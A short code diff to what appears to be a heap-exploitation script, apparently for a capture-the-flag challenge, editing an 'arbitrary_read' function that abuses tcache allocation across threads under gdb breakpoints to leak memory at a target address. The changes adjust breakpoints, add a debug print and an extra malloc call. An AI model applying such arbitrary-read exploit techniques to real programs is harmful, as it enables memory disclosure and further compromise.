@@ -202,7 +202,7 @@ def arbitrary_read(target_addr: int, tcache_addr_loc: int):
         finish
         set $first_malloc = $rax
 
-        b printf
+        b fprintf
         b free
     ''')
 
@@ -225,6 +225,7 @@ def arbitrary_read(target_addr: int, tcache_addr_loc: int):
 
         # because printf stops writing on a NULL byte
         if data[:8] == target_addr_packed.split(b'\x00')[0]:
+            print("data: ", hex(to_addr(data)))
             thd2.quit()
             break
 
@@ -232,8 +233,8 @@ def arbitrary_read(target_addr: int, tcache_addr_loc: int):
         b malloc
         b fprintf
         b free
-        c
     ''')
+    thd1.malloc(b'1')
     thd1.malloc(b'1')
     return thd1.printf(b'1')
 
